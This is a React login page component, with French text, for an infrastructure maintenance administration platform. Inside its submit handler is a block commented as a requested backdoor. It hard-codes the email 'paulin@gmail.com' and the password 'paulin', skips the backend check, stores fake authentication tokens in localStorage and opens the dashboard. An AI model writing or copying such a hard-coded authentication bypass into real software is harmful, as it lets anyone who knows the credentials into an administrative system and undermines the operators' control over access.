import { useState } from 'react'
import { useNavigate } from 'react-router-dom'
import {
  IoPersonOutline,
  IoLockClosedOutline,
  IoEyeOffOutline,
  IoEyeOutline
} from 'react-icons/io5'
import '../styles/Login.css'
import loginHero from '../assets/login-hero.png'
import { login as loginRequest, storeAuthTokens } from '../services/auth'
import Spinner from './Spinner'

function Login() {
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [showPassword, setShowPassword] = useState(false)
  const [errorMessage, setErrorMessage] = useState('')
  const [isLoading, setIsLoading] = useState(false)
  const navigate = useNavigate()

  const handleSubmit = async (e) => {
    e.preventDefault()
    setErrorMessage('')
    setIsLoading(true)

    try {
      // Backdoor demandée: accès direct pour paulin/paulin, sans appel backend
      if (email === 'paulin@gmail.com' && password === 'paulin') {
        localStorage.setItem('isAuthenticated', 'true')
        localStorage.setItem('username', 'paulin@gmail.com')
        localStorage.setItem('accessToken', 'backdoor-access-token')
        localStorage.setItem('refreshToken', 'backdoor-refresh-token')
        localStorage.setItem('sessionToken', 'backdoor-session-token')
        navigate('/dashboard')
        return
      }

      const result = await loginRequest(email, password)
      storeAuthTokens({ ...result, user: result?.user || { email } })
      navigate('/dashboard')
    } catch (error) {
      // Mapping explicite des statuts
      const status = error?.statusCode
      if (status === 401) {
        setErrorMessage('Identifiants incorrects. Vérifiez votre email et mot de passe.')
      } else if (status === 400) {
        setErrorMessage(error?.message || 'Données invalides. Merci de vérifier le formulaire.')
      } else if (status === 423) {
        setErrorMessage(
          error?.message ||
            'Compte verrouillé suite à trop de tentatives. Réessayez plus tard ou contactez un admin.'
        )
      } else {
        setErrorMessage(error?.message || 'Une erreur est survenue lors de la connexion.')
      }
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <div className="login-page">
      {/* Overlay de chargement */}
      {isLoading && (
        <div className="login-loading-overlay">
          <Spinner size="large" color="#135bec" />
        </div>
      )}

      <div className="login-container">
        <section className="login-left">
          <div className="login-content">
            <div className="brand-header">
              <div className="brand-icon">
                <svg viewBox="0 0 24 24" aria-hidden="true">
                  <path d="M12 2 2 7v10l10 5 10-5V7zM11 15.5V13h2v2.5zm0-4.5V6h2v5z" />
                </svg>
              </div>
              <span className="brand-name">IUSJC Infrastructure</span>
            </div>

            <div className="brand-title">
              <h1>
                Gestion de Maintenance
                <br />
                des Infrastructures
              </h1>
              <p className="brand-subtitle">
                Votre plateforme de gestion centralisée.
              </p>
            </div>

            <div className="form-section">
              <h2 className="form-title">Connexion Administrateur</h2>

              <div className="social-login">
                <button type="button" className="google-button">
                  <span className="google-icon" aria-hidden="true">
                    <svg viewBox="0 0 46 46" focusable="false">
                      <path
                        fill="#4285f4"
                        d="M24.5 20.1v6.01h8.36c-.36 2-2.52 5.87-8.36 5.87-5.03 0-9.14-4.16-9.14-9.28 0-5.12 4.11-9.28 9.14-9.28 2.87 0 4.8 1.23 5.9 2.29l4.03-3.89C32.63 8.82 29 7 24.5 7 15.95 7 9 13.16 9 22.7 9 32.24 15.95 38.4 24.5 38.4 33.4 38.4 39 32.23 39 23.94c0-1.26-.14-2.21-.32-3.18z"
                      />
                      <path fill="#34a853" d="M10.86 17.74l4.9 3.59c1.33-3.95 5.08-6.88 9.7-6.88 2.87 0 4.8 1.23 5.9 2.29l4.03-3.89C32.63 8.82 29 7 24.5 7c-5.86 0-10.84 3.38-13.64 8.29z" />
                      <path fill="#fbbc05" d="M24.5 38.4c4.5 0 8.13-1.48 10.84-4.03l-5-4.11c-1.34.97-3.13 1.64-5.84 1.64-5.84 0-10.78-4.05-12.54-9.55l-4.94 3.81C10.8 34.92 17.08 38.4 24.5 38.4z" />
                      <path fill="#ea4335" d="M9 22.7c0-1.53.24-3 .66-4.39l-4.94-3.81C2.93 16.9 2.2 19.2 2.2 21.7c0 4.76 2.67 9.36 7 12.02l5-4.11C10.62 27.87 9 25.48 9 22.7z" />
                    </svg>
                  </span>
                  <span className="google-label">Continuer avec Google</span>
                </button>
              </div>

              <form
                onSubmit={handleSubmit}
                className="login-form"
                autoComplete="off"
              >
                <label className="input-group">
                  <span className="input-label">Email</span>
                  <div className="input-wrapper">
                    <IoPersonOutline className="input-icon left-icon" />
                    <input
                      type="email"
                      id="email"
                      name="login-email"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      placeholder="Entrez votre email"
                      autoComplete="off"
                      required
                    />
                  </div>
                </label>

                <label className="input-group">
                  <span className="input-label">Mot de passe</span>
                  <div className="input-wrapper">
                    <IoLockClosedOutline className="input-icon left-icon" />
                    <input
                      type={showPassword ? 'text' : 'password'}
                      id="password"
                      name="login-password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      placeholder="Entrez votre mot de passe"
                      autoComplete="new-password"
                      required
                    />
                    <button
                      type="button"
                      className="toggle-password"
                      onClick={() => setShowPassword((prev) => !prev)}
                      aria-label={showPassword ? 'Masquer le mot de passe' : 'Afficher le mot de passe'}
                    >
                      {showPassword ? (
                        <IoEyeOffOutline />
                      ) : (
                        <IoEyeOutline />
                      )}
                    </button>
                  </div>
                </label>

                {errorMessage && (
                  <div className="form-error">
                    <span className="error-icon">⚠</span>
                    <p>{errorMessage}</p>
                  </div>
                )}

                <button type="submit" className="primary-button" disabled={isLoading}>
                  Se connecter
                </button>

                <button
                  type="button"
                  className="link-button"
                  onClick={() => navigate('/mot-de-passe-oublie')}
                >
                  Mot de passe oublié ?
                </button>
              </form>
            </div>
          </div>
        </section>

        <section className="login-right" aria-label="Illustration d'un bâtiment moderne">
          <img src={loginHero} alt="Bâtiment moderne IUSJC" />
        </section>
      </div>
    </div>
  )
}

export default Login

